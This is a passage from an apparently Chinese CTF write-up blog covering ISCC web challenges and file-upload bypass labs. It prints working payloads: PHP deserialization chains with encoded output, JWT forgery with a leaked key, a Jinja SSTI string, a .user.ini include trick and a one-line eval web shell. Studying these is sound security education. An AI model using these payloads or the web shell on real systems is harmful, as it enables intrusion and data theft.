class="hljs-variable">$slice</span></span>)</span>&#123; <br>        <span class="hljs-variable">$melt</span> = <span class="hljs-variable language_">$this</span>-&gt;flavors; <br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$melt</span>(); <br>    &#125; <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123; <br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$this</span>-&gt;color)(); <br>    &#125; <br>&#125; <br> <br><span class="hljs-variable">$q</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Cheese</span>(); <br><span class="hljs-variable">$w</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Jerry</span>(); <br><span class="hljs-variable">$q</span>-&gt;color=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$w</span>); <br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$q</span>));<br><br></code></pre></td></tr></table></figure><p><img src="/%5Cimages%5CISCC2.png"></p><p>PD9waHAKICAgICRmbGFnID0gIklTQ0N7Y2gzM3NlX3RoIWVmXyE1X3RoZSI7CiAgICAvLyDkvYbmgI7kuYjlj6rmnInkuIDljYrlkaLvvJ8KCS8vIEplcnJ56L+Y5ZCs5Yiw5Yir55qE6byg6byg6K+0VG9t55SoMjLnmoQxNui&#x2F;m+WItuW8guaIluS7gOS5iOeahO+8jOWVpeaEj+aAneWRou+8nwo&#x2F;Pg&#x3D;&#x3D;</p><p>解密得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;ISCC&#123;ch33se_th!ef_!5_the&quot;</span>;<br> <span class="hljs-comment">// 但怎么只有一半呢？</span><br> <span class="hljs-comment">// Jerry还听到别的鼠鼠说Tom用22的16进制异或什么的，啥意思呢？</span><br> <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>第二段是要对文件名进行解密后，cheeseOne变成cheeseTwo然后再变成base64加密后的</p><p><code>Y2hlZXNlVHdv</code></p><p>访问权限限制，只有管理员才能看到</p><p><img src="/%5Cimages%5CISCC3.png"></p><p>jwt伪造，伪造成管理员身份，密钥在源码里</p><p><code>Jerry_Loves_Cheese</code></p><p><img src="/%5Cimages%5CISCC4.png"></p><p><img src="/%5Cimages%5CISCC5.png"></p><p>✅ <strong>管理员认证成功！</strong><br> 奶酪最终位置： <strong>&#x2F;c3933845e2b7d466a9776a84288b8d86.php</strong></p><p>访问得到一串字符串</p><p><img src="/%5Cimages%5CISCC6.png"></p><p><code>I&amp;x%Its~7xy&#39;Ib~sIaV&#39;&#39;ek</code>根据原来的提示最后测试为是与0x16异或得到</p><p>交给ai解答</p><p><img src="/%5Cimages%5CISCC7.png"></p><p><code>_0n3_beh!no1_the_w@11s&#125;</code></p><p>得到最终的flag</p><p><code>ISCC&#123;ch33se_th!ef_!5_the_0n3_beh!no1_the_w@11s&#125;</code></p><h1 id="区域赛部分"><a href="#区域赛部分" class="headerlink" title="区域赛部分"></a>区域赛部分</h1><h2 id="十八铜人"><a href="#十八铜人" class="headerlink" title="十八铜人"></a>十八铜人</h2><p><img src="/%5Cimages%5CISCC8.png"></p><p>明显是get传参，第一个session：</p><p><img src="/%5Cimages%5CISCC9.png"></p><p>访问路由得：</p><p><img src="/%5Cimages%5CISCC10.png"></p><p><em>显示：你过关！kGf5tN1yO8M这样就能拿到flag了吗？住持提出了新的要求：去闯下一关吧！闯过下一关就能拿到flag</em></p><p><code>/nauygnoiqnebna</code>是第二关，构造即可。</p><p><code>Yongzheng=&#123;&#123;lipsum l attr(request.args.a1) l attr(request.args.a2)(request.args.a3) l attr(request.args.a4)((request.args.a5)) l attr(request.args.a6)()&#125;&#125;</code></p><p>BP响应得到flag。</p><h2 id="想犯大吴疆土吗"><a href="#想犯大吴疆土吗" class="headerlink" title="想犯大吴疆土吗"></a>想犯大吴疆土吗</h2><p>源码发现注释，审计输入url?box1&#x3D;古锭刀&amp;box2&#x3D;杀&amp;box3&#x3D;酒&amp;box4&#x3D;铁索连环得到原码：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /?box1=%E5%<span class="hljs-number">8</span>F%A4%E9%<span class="hljs-number">94</span>%AD%E5%<span class="hljs-number">88</span>%<span class="hljs-number">80</span>&amp;box2=%E6%<span class="hljs-number">9</span>D%<span class="hljs-number">80</span>&amp;box3=%E9%<span class="hljs-number">85</span>%<span class="hljs-number">92</span>&amp;box4=%E9%<span class="hljs-number">93</span>%<span class="hljs-number">81</span>%E7%B4%A2%E8%BF%<span class="hljs-number">9</span>E%E7%<span class="hljs-number">8</span>E%AF HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: <span class="hljs-number">112.126.73.173:49101</span><br><span class="hljs-attribute">Cache</span>-Control: max-age=<span class="hljs-number">0</span><br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">136.0.0.0</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,application/signed-exchange;v=b3;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><br><span class="hljs-attribute">Cookie</span>: PHPSESSID=<span class="hljs-number">515</span>a4a744cb2d53dd77dd970febd696a<br><span class="hljs-attribute">Connection</span>: close<br><br><br><br><br></code></pre></td></tr></table></figure><p>得到的reward.php：</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php"><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;xusheng&#x27;</span>])) &#123;</span><br><span class="language-php">    <span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Reward<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;font-family:sans-serif;text-align:center;margin-top:15%;&quot;</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>想直接拿奖励？<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>尔要试试我宝刀是否锋利吗？<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml">    </span><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php">    <span class="hljs-keyword">exit</span>;</span><br><span class="language-php">&#125;</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);</span><br><span class="language-php"><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;display_errors&#x27;</span>, <span class="hljs-number">0</span>);</span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-comment">// 犯flag.php疆土者，盛必击而破之！</span></span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GuDingDao</span> </span>&#123;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-variable">$desheng</span>;</span><br><span class="language-php"></span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="language-php">        <span class="hljs-variable language_">$this</span>-&gt;desheng = <span class="hljs-keyword">array</span>();</span><br><span class="language-php">    &#125;</span><br><span class="language-php"></span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$yishi</span></span>) </span>&#123;</span><br><span class="language-php">        <span class="hljs-variable">$dingjv</span> = <span class="hljs-variable language_">$this</span>-&gt;desheng;</span><br><span class="language-php">        <span class="hljs-variable">$dingjv</span>();</span><br><span class="language-php">        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;下次沙场相见, 徐某定不留情&quot;</span>;</span><br><span class="language-php">    &#125;</span><br><span class="language-php">&#125;</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TieSuoLianHuan</span> </span>&#123;</span><br><span class="language-php">    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$yicheng</span>;</span><br><span class="language-php"></span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">append</span>(<span class="hljs-params"><span class="hljs-variable">$pojun</span></span>) </span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$pojun</span>);</span><br><span class="language-php">    &#125;</span><br><span class="language-php"></span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="language-php">        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">append</span>(<span class="hljs-variable">$this</span>-&gt;yicheng);</span><br><span class="language-php">    &#125;</span><br><span class="language-php">&#125;</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Jie_Xusheng</span> </span>&#123;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-variable">$sha</span>;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-variable">$jiu</span>;</span><br><span class="language-php"></span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$secret</span> = <span class="hljs-string">&#x27;reward.php&#x27;</span></span>) </span>&#123;</span><br><span class="language-php">        <span class="hljs-variable language_">$this</span>-&gt;sha = <span class="hljs-variable">$secret</span>;</span><br><span class="language-php">    &#125;</span><br><span class="language-php"></span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;jiu-&gt;sha;</span><br><span class="language-php">    &#125;</span><br><span class="language-php"></span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/file|ftp|http|https|gopher|dict|\.\./i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;sha)) &#123;</span><br><span class="language-php">            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;你休想偷看吴国机密&quot;</span>;</span><br><span class="language-php">            <span class="hljs-variable language_">$this</span>-&gt;sha = <span class="hljs-string">&quot;reward.php&quot;</span>;</span><br><span class="language-php">        &#125;</span><br><span class="language-php">    &#125;</span><br><span class="language-php">&#125;</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;你什么都没看到？那说明……有东西你没看到&lt;br&gt;&#x27;</span>;</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;xusheng&#x27;</span>])) &#123;</span><br><span class="language-php">    @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;xusheng&#x27;</span>]);</span><br><span class="language-php">&#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="language-php">    <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Jie_Xusheng</span>;</span><br><span class="language-php">    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);</span><br><span class="language-php">&#125;</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-comment">// 铸下这铁链，江东天险牢不可破！</span></span><br><span class="language-php"></span><br></code></pre></td></tr></table></figure><p>审计代码，写反序化链(这个链子的话触发是通过正则去触发<code>__toString()</code>的，然后正常打就行)</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs xquery">*&lt;?php*<br>*class GuDingDa<span class="hljs-number">0</span> &#123;* <br>  *public <span class="hljs-variable">$desheng</span>;* <br>  *public <span class="hljs-keyword">function</span> __get(<span class="hljs-variable">$yishi</span>) &#123;* <br>​    *<span class="hljs-variable">$dingjv</span> = <span class="hljs-variable">$this-</span>&gt;desheng;* <br>​    *<span class="hljs-variable">$dingjv</span>();* <br>​    *<span class="hljs-keyword">return</span> <span class="hljs-string">&quot;下次沙场相见, 徐某定不留情&quot;</span>;* <br>  *&#125;* <br>*&#125;* <br>*class TieSuoLianHuan &#123;* <br>  *public <span class="hljs-variable">$yicheng</span>;*<br>  *public <span class="hljs-keyword">function</span> append(<span class="hljs-variable">$pojun</span>) &#123;* <br>​    *include(<span class="hljs-variable">$pojun</span>);* <br>  *&#125;* <br>  *public <span class="hljs-keyword">function</span> __invoke() &#123;* <br>​    *<span class="hljs-variable">$this-</span>&gt;append(<span class="hljs-variable">$this-</span>&gt;yicheng);*<br>  *&#125;* <br>*&#125;* <br>*class Jie_Xusheng &#123;* <br>  *public <span class="hljs-variable">$sha</span>;* <br>  *public <span class="hljs-variable">$jiu</span>;* <br>  *public <span class="hljs-keyword">function</span> __toString() &#123;* <br>​    *<span class="hljs-keyword">return</span> <span class="hljs-variable">$this-</span>&gt;jiu-&gt;sha;* <br>  *&#125;* <br>  *public <span class="hljs-keyword">function</span> __wakeup() &#123;* <br>​    *<span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/file|ftp|http|https|gopher|dict|\.\./i&quot;</span>, <span class="hljs-variable">$this-</span>&gt;sha)) &#123;* <br>​      *echo <span class="hljs-string">&quot;你休想偷看吴国机密&quot;</span>;* <br>​      *<span class="hljs-variable">$this-</span>&gt;sha = <span class="hljs-string">&quot;reward.php&quot;</span>;* <br>​    *&#125;* <br>  *&#125;* <br>*&#125;* <br>*<span class="hljs-variable">$a</span>=new Jie_Xusheng();* <br>*<span class="hljs-variable">$a-</span>&gt;sha=<span class="hljs-string">&#x27;dict&#x27;</span>;*<br>*<span class="hljs-variable">$b</span>=new GuDingDa<span class="hljs-number">0</span>();* <br>*<span class="hljs-variable">$a-</span>&gt;sha=new Jie_Xusheng();* <br>*<span class="hljs-variable">$a-</span>&gt;sha-&gt;jiu=<span class="hljs-variable">$b</span>;*<br>*<span class="hljs-variable">$a-</span>&gt;sha-&gt;jiu-&gt;desheng=new TieSuoLianHuan();* <br>*<span class="hljs-variable">$a-</span>&gt;sha-&gt;jiu-&gt;desheng-&gt;yicheng=<span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=flag.php&#x27;</span>;*<br>*echo urlencode(serialize(<span class="hljs-variable">$a</span>));* <br>*O<span class="hljs-meta">%3A11</span><span class="hljs-meta">%3A</span><span class="hljs-meta">%22Jie_Xusheng</span><span class="hljs-meta">%22</span><span class="hljs-meta">%3A2</span><span class="hljs-meta">%3A</span><span class="hljs-meta">%7Bs</span><span class="hljs-meta">%3A3</span><span class="hljs-meta">%3A</span><span class="hljs-meta">%22sha</span><span class="hljs-meta">%22</span><span class="hljs-meta">%3BO</span><span class="hljs-meta">%3A11</span><span class="hljs-meta">%3A</span><span class="hljs-meta">%22Jie_Xusheng</span><span class="hljs-meta">%22</span><span class="hljs-meta">%3A2</span><span class="hljs-meta">%3A</span><span class="hljs-meta">%7Bs</span><span class="hljs-meta">%3A3</span><span class="hljs-meta">%3A</span><span class="hljs-meta">%22sha</span><span class="hljs-meta">%22</span><span class="hljs-meta">%3BN</span><span class="hljs-meta">%3Bs</span><span class="hljs-meta">%3A3</span><span class="hljs-meta">%3A</span><span class="hljs-meta">%22jiu</span><span class="hljs-meta">%22</span><span class="hljs-meta">%3BO</span><span class="hljs-meta">%3A9</span><span class="hljs-meta">%3A</span><span class="hljs-meta">%22GuDingDa0</span><span class="hljs-meta">%22</span><span class="hljs-meta">%3A1</span><span class="hljs-meta">%3A</span><span class="hljs-meta">%7Bs</span><span class="hljs-meta">%3A7</span><span class="hljs-meta">%3A</span><span class="hljs-meta">%22desheng</span><span class="hljs-meta">%22</span><span class="hljs-meta">%3BO</span><span class="hljs-meta">%3A14</span><span class="hljs-meta">%3A</span><span class="hljs-meta">%22TieSuoLianHuan</span><span class="hljs-meta">%22</span><span class="hljs-meta">%3A1</span><span class="hljs-meta">%3A</span><span class="hljs-meta">%7Bs</span><span class="hljs-meta">%3A7</span><span class="hljs-meta">%3A</span><span class="hljs-meta">%22yicheng</span><span class="hljs-meta">%22</span><span class="hljs-meta">%3Bs</span><span class="hljs-meta">%3A52</span><span class="hljs-meta">%3A</span><span class="hljs-meta">%22php</span><span class="hljs-meta">%3A</span><span class="hljs-meta">%2F</span><span class="hljs-meta">%2Ffilter</span><span class="hljs-meta">%2Fconvert</span>.base64-encode<span class="hljs-meta">%2Fresource</span><span class="hljs-meta">%3Dflag</span>.php<span class="hljs-meta">%22</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%7D</span><span class="hljs-meta">%7D</span><span class="hljs-meta">%7Ds</span><span class="hljs-meta">%3A3</span><span class="hljs-meta">%3A</span><span class="hljs-meta">%22jiu</span><span class="hljs-meta">%22</span><span class="hljs-meta">%3BN</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%7D</span>*<br></code></pre></td></tr></table></figure><p><img src="/%5Cimages%5CISCC11.png"></p><h2 id="回归基本功"><a href="#回归基本功" class="headerlink" title="回归基本功"></a>回归基本功</h2><p>根据提示代理推测改代理为GaoJiGongChengShiFoYeGe</p><p><img src="/%5Cimages%5CISCC12.png"></p><p>打开文件查看</p><p><img src="/%5Cimages%5CISCC13.png"></p><p>审计代码，给a传任意数字，b传任意字符字符，字符弱比较都为0，设置c为一个值，使得c&#x3D;a后，<code>$huiguiflag[1]==md5($c）</code>查资料知Php7.5版本下面有非法字符传参那个漏洞把_改为[</p><p><img src="/%5Cimages%5CISCC14.png"></p><p>Url为</p><p><code>huigui[jibengong.1=1&amp;huigui[jibengong.2=jibengong&amp;huigui[jibengong.3=jibengong+%261=e559dcee72d03a13110efe9b6355b30d</code></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>文件上传</title>
    <link href="/2025/05/06/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <url>/2025/05/06/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p>1.只是前端校验，可通过在前端修改后缀</p><p>2.后端单一校验，可通过抓包改后缀不改文件类型</p><p><img src="/../images/9a762f47-2287-47f7-b391-096b379b28aa.png" alt="9a762f47-2287-47f7-b391-096b379b28aa"></p><p>若存在后端校验，同样上传jpg，只改前端无法绕过。</p><p><img src="/../images/eddc040ccdda087f6262057a63c5bdbe.png" alt="eddc040ccdda087f6262057a63c5bdbe"></p><p><img src="/../images/5a90eab4cca48291f96c1dfc3cab70f3.png" alt="5a90eab4cca48291f96c1dfc3cab70f3"></p><p>(不在同一目录下可用tac  ..&#x2F;flag.php)</p><h3 id="web153"><a href="#web153" class="headerlink" title="web153"></a>web153</h3><ul><li><strong>.user.ini 的作用</strong>：它是一个“目录级”的配置文件，可以自动影响该目录下所有PHP文件的行为。</li><li><strong>核心指令</strong>：<code>auto_prepend_file</code>（在PHP文件<strong>前</strong>包含）和 <code>auto_append_file</code>（在PHP文件<strong>后</strong>包含）。</li><li><strong>妙用</strong>：利用这个机制，<strong>将一个非PHP格式的文件（如图片）强制作为PHP代码来执行</strong>，从而绕过上传限制。</li><li><strong>关键条件</strong>：<strong>目录下必须有一个可被访问执行的PHP文件</strong>（如index.php）来作为“触发器”。</li></ul><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">auto_prepend_file</span>=shell.png<br></code></pre></td></tr></table></figure><p>只需上传shell.png(一句话木马),再通过bp改包上传ini即可</p><h3 id="web154"><a href="#web154" class="headerlink" title="web154"></a>web154</h3><h4 id="关于PHP短标签和分号的说明"><a href="#关于PHP短标签和分号的说明" class="headerlink" title="关于PHP短标签和分号的说明"></a>关于PHP短标签和分号的说明</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span> ... <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这是最原始的短标签形式，可以用来包含任何PHP代码。不过默认是关闭的，需要在 php.ini 文件中将 short_open_tag 设置为 On 才能使用</p><p>在PHP中，短标签<code>&lt;?=</code>是<code>&lt;?php echo</code>的简写形式，用于快速输出内容。</p><p>同153，加了个文件内容过滤了php，可用短标签代替</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>连接后看见源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//upload.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;error&quot;</span>] &gt; <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-variable">$ret</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;code&quot;</span>=&gt;<span class="hljs-number">2</span>,<span class="hljs-string">&quot;msg&quot;</span>=&gt;<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;error&quot;</span>]);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>];<span class="hljs-comment">//获取文件名</span><br>    <span class="hljs-variable">$filesize</span> = (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;size&quot;</span>] / <span class="hljs-number">1024</span>);<span class="hljs-comment">//获取文件大小</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$filesize</span>&gt;<span class="hljs-number">1024</span>)&#123;<br>    <span class="hljs-variable">$ret</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;code&quot;</span>=&gt;<span class="hljs-number">1</span>,<span class="hljs-string">&quot;msg&quot;</span>=&gt;<span class="hljs-string">&quot;文件超过1024KB&quot;</span>);<span class="hljs-comment">//限制文件大小</span><br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/png&#x27;</span>)&#123;<span class="hljs-comment">//检查MIME类型是否为png图像类型</span><br>            <span 